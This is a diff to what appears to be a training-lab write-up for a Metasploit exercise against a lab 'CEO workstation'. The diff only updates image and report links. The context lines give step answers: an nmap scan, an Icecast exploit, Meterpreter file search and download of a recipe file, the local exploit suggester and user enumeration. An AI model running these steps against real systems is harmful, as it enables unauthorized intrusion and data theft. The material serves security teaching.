@@ -51,7 +51,7 @@ You are now ready to being the activity.
 
 Once you complete this assignment, submit your findings in the following document:
 
-![Report.md](./Report/Report.md)
+![Report.md](./Readme.md)
 
 Instructions
 You've been provided full access to the network and are getting ping responses from the CEO’s workstation.
@@ -62,7 +62,7 @@ You've been provided full access to the network and are getting ping responses f
 
 > Answer: nmap -sV 192.168.0.20
 
-![Nmap version scan](./Images/Figure-1.png)
+![Figure-1](./Images/Figure-1.PNG)
 
 1. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
@@ -93,7 +93,7 @@ Note: Instead of copying the entire path to the module, you can use the number i
 
 > Answer: **set RHOST 192.168.0.20**
 
-![Nmap version scan](./Images/Figure-2.png)
+![Figure-2](./Images/Figure-2.PNG)
 
 1. Run the Icecast exploit.
 
@@ -105,7 +105,7 @@ Note: Instead of copying the entire path to the module, you can use the number i
 
 > Answer: **search -f *secretfile*.txt**
 
-![Nmap version scan](./Images/Figure-3.png)
+![Figure-3](./Images/Figure-3.PNG)
 
 1. You should now have a Meterpreter session open.
 
@@ -117,13 +117,13 @@ Bonus: Run the command that exfiltrates the recipe*.txt file:
 
 > Answer: **download 'c:\Users\IEuser\Documents\Drinks.recipe.txt'**
 
-![Nmap version scan](./Images/Figure-4.png)
+![Figure-4](./Images/Figure-4.PNG)
 
 1. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
 > Answer: **run post/multi/recon/local_exploit_suggester**
 
-![Nmap version scan](./Images/Figure-5.png)
+![Figure-5](./Images/Figure-5.PNG)
 
 Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
 
@@ -132,7 +132,7 @@ A. Run a Meterpreter post script that enumerates all logged on users.
 
 > Answer: **run post/windows/gather/enum_logged_on_users**
 
-![Nmap version scan](./Images/Figure-6.png)
+![Figure-6](./Images/Figure-6.PNG)
 
 B. Open a Meterpreter shell and gather system information for the target.
 
@@ -142,4 +142,4 @@ C. Run the command that displays the target's computer system information:
 
 > Answer: **systeminfo**
 
-![Nmap version scan](./Images/Figure-7.png)
+![Figure-7](./Images/Figure-7.PNG)
